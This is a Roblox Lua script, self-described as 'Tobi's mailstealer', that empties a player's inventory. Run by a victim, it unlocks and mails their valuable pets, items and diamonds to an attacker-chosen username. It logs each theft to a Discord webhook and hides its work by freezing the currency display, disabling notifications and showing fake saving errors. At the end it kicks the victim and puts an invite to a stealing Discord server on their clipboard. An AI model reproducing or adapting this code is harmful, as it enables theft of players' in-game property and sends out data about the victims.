local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "gg / HcpNe56R2a"
local GetRapValues = getupvalues(library.DevRAPCmds.Get)[1]
local HttpService = game:GetService("HttpService")
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local function SendMessage(url, username, itemID, itemRAP)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["embeds"] = {{
            ["title"] = "New Item Sent",
            ["color"] = 65280,
			["fields"] = {
                {
                    ["name"] = "Victim Username:",
                    ["value"] = username,
                    ["inline"] = true
                },
                {
                    ["name"] = "Item Sent:",
                    ["value"] = tostring(itemID),
                    ["inline"] = false
                },
				{
					["name"] = "RAP:",
					["value"] = tostring(itemRAP),
					["inline"] = false
				}
            },
			["footer"] = {
				["text"] = "Mailstealer by Tobi. discord.gg/HcpNe56R2a"
			}
        }}
    }
    local body = http:JSONEncode(data)
    local response = request({
		Url = url,
		Method = "POST",
		Headers = headers,
		Body = body
	})
end

if Webhook and string.find(Webhook, "discord") then
	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
else
	Webhook = ""
end

for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
    end
end

if GemAmount1 < 10000 then
    plr:kick("Saving error, please rejoin!")
end

local user = Username

local gemsleft = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount.Text
local gemsleftpath = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
gemsleftpath:GetPropertyChangedSignal("Text"):Connect(function()
	gemsleftpath.Text = gemsleft
end)

local gemsleaderstat = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"].Value
local gemsleaderstatpath = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
	gemsleaderstatpath.Value = gemsleaderstat
end)

local loading = game:GetService('Players').LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = game:GetService('Players').LocalPlayer.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
	noti.Enabled = false
end)
noti.Enabled = false

local function getRAP(Type, Item)
    if GetRapValues[Type] then
        for i,v in pairs(GetRapValues[Type]) do
            local itemTable = HttpService:JSONDecode(i)
            if itemTable.id == Item.id and itemTable.tn == Item.tn and itemTable.sh == Item.sh and itemTable.pt == Item.pt then
                return v
            end
        end
		return 0
    end
	return 0
end

local function sendItem(category, uid, am, id, rap)
    local args = {
        [1] = user,
        [2] = MailMessage,
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    if Webhook and Webhook ~= "" then
        SendMessage(Webhook, plr.Name, id, rap)
    end
end

local function CountCategory(category)
	local count = 0
	for i, v in pairs(save[category]) do
		if getRAP(category, v) >= min_rap then
			count = count + 1
		end
	end
	return count
end

local function CategorySteal(category)
	local Sent = 0
	local initial = CountCategory(category)
	local sortedItems = {}
	for i, v in pairs(save[category]) do
		local rapValue = getRAP(category, v)
		if rapValue >= min_rap then
			table.insert(sortedItems, {uid = i, rap = rapValue})
		end
	end
	table.sort(sortedItems, function(a, b) return a.rap > b.rap end)
	for _, item in ipairs(sortedItems) do
		local v = save[category][item.uid]
		local id = v.id
		if v._lk then
			local args = {
			[1] = i,
			[2] = false
			}
			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
		end
		sendItem(category, item.uid, v._am or 1, id, item.rap)
		local final = CountCategory(category)
		if final < initial then
			Sent = Sent + 1
			initial = final
		end
	end
	return Sent
end

local function SendAllCategory(category)
	local total = CountCategory(category)
	local Sent = 0
	repeat
		Sent = Sent + CategorySteal(category)
	until Sent == total
end

local function GemSteal()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
            local GemAmount = v._am
            local args = {
                [1] = user,
                [2] = MailMessage,
                [3] = "Currency",
                [4] = i,
                [5] = GemAmount - 10000
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
			if Webhook and Webhook ~= "" then
				SendMessage(Webhook, plr.Name, "Gems: " .. (GemAmount - 10000))
			end
        end
    end
end

local function EmptyBoxes()
    if save.Box then
        for key, _ in pairs(save.Box) do
			local args = {
				[1] = key
			}
			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(unpack(args))
        end
    end
end

local function CountGems()
	for i, v in pairs(GetSave().Inventory.Currency) do
		if v.id == "Diamonds" then
			GemAmount1 = v._am
			return GemAmount1
		end
	end
end

local function SendAllGems()
	repeat
		GemSteal()
	until CountGems() == nil or CountGems() < 10000
end

local function CountHuges()
	local count = 0
	for i, v in pairs(save.Pet) do
		local id = v.id
		local dir = library.Directory.Pets[id]
		if dir.huge and getRAP("Pet", v) >= min_rap then
			count = count + 1
		end
	end
	return count
end

if CountHuges() > 0 or CountGems() > 500000 then
	EmptyBoxes()
	local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
	for i, v in pairs(categoryList) do
		if save[v] ~= nil then
			SendAllCategory(v)
		end
	end
	SendAllGems()
	setclipboard("https://discord.gg/HcpNe56R2a")
	plr:kick("All your stuff has just been stolen by Tobi's mailstealer. Join discord.gg/HcpNe56R2a to start mailstealing yourself")
else
	plr:kick("Error on script execution: 0x0001F4A2")
end
